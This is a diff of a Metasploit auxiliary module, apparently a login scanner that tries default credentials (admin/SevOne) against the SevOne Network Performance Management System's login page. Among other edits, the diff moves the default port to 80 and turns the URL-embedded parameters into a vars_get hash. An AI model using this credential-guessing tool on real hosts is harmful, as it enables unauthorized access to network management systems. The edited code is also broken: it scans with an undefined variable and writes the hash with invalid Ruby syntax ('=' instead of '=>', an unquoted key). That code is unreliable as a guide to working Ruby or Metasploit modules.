@@ -25,15 +25,14 @@ class Metasploit3 < Msf::Auxiliary
 				[
 					'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
 				],
-			'DisclosureDate' => 'June 07, 2013',
+			'DisclosureDate' => 'Jun 07, 2013',
 			'License'        => MSF_LICENSE
 		))
 	register_options(
 		[
-			Opt::RPORT(8443),
+			Opt::RPORT(80),
 			OptString.new('USERNAME', [false, 'A specific username to authenticate as', 'admin']),
-			OptString.new('PASSWORD', [false, 'A specific password to authenticate with', 'SevOne']),
-			OptString.new('STOP_ON_SUCCESS', [true, 'Stop guessing when a credential works for a host', true])
+			OptString.new('PASSWORD', [false, 'A specific password to authenticate with', 'SevOne'])		
 		], self.class)
 	end
 
@@ -61,7 +60,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		if (res and res.code.to_i == 200 and res.headers['Set-Cookie'].include?('SEVONE'))
 			version_key = /Version: <strong>(.+)<\/strong>/
-			version = res.body.scan(version_key).flatten
+			version = res.body.scan(version).flatten
 			print_good("Application confirmed to be SevOne Network Performance Management System version #{version}")
 			success = true
 		end
@@ -75,8 +74,15 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			res = send_request_cgi(
 			{
-				'uri'       => "/doms/login/processLogin.php?login=#{user}&passwd=#{pass}&tzOffset=-25200&tzString=Thur+May+05+1983+05:05:00+GMT+0700+",
-				'method'    => 'GET'
+				'uri'       => "/doms/login/processLogin.php",
+				'method'    => 'GET',
+				vars_get    =>
+				{
+					'login' = user,
+					'passwd' = pass,
+					'tzOffset' = '-25200',
+					'tzString' = 'Thur+May+05+1983+05:05:00+GMT+0700+'
+				}
 			})
 
 		check_key = "The user has logged in successfully."
